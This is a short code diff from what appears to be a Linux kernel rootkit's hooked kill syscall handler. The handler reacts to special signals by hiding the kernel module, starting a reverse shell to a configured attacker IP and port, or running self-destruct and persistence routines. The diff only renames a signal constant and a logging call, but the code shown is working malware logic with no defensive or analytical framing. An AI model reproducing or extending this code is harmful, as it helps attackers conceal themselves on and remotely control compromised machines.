@@ -52,14 +52,14 @@ int new_kill(const struct pt_regs *pt_regs)
             else
                 module_hide();
             break;
-        case SIGNAL_REVERSE_SHELL:
+        case SIGREVSHELL:
             start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
             break;
         case SIGDESTRUCT:
             module_show();
             kboom_persistence();
             kboom();
-            printk(KERN_INFO "CALL SELFDESTRUCT WITH SIG");
+            m_printd(KERN_INFO "CALL SELFDESTRUCT WITH SIG");
             break;
         default:
         return old_kill(pt_regs);
